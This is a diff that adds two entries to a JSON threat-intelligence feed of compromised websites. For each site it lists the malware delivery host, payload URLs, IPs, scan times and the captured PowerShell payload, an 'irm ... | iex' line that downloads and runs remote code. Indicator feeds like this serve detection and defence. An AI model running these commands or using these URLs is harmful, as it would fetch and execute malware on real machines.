@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "www.ctrlsphoto.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/6a000d322fd3c724"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/6a000d322fd3c724')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/6a000d322fd3c724"
+    ],
+    "ReportId": "cmwzd702m0iv20omlo0974ppz",
+    "ScannedAt": "2026-11-27T19:18:42.524000+00:00"
+  },
+  {
+    "UrlDomain": "gkypluit.church",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4af3ebdee69c4e0b"
+    ],
+    "IP": [
+      "167.172.69.9"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/4af3ebdee69c4e0b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4af3ebdee69c4e0b"
+    ],
+    "ReportId": "cmwzd6ocn0ith0omltr54b6zu",
+    "ScannedAt": "2026-11-27T19:18:27.332000+00:00"
+  },
+  {
     "UrlDomain": "aispar.africa",
     "DeliveryUrl": [
       "j7tracker.gb.net"
